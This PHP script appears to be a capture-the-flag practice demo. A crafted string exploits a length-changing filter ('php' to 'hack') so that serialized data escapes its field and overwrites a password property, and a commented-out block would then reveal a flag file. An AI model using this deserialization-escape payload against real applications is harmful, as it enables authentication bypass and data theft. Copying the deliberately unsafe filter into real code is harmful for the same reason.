<?php

function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hack",$name);
    return $name;
}
class test{
    var $user;
    var $pass='daydream';
    function __construct($user){
        $this->user=$user;
    }
}

$param  = '123phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}';
$param  = serialize(new test($param));
$param2 =  filter($param);


echo $param;
echo "\n------------------\n";
echo $param2;

/*
$profile=unserialize($param2);


if ($profile->pass=='escaping'){
    echo file_get_contents("flag.php");
}
*/


?>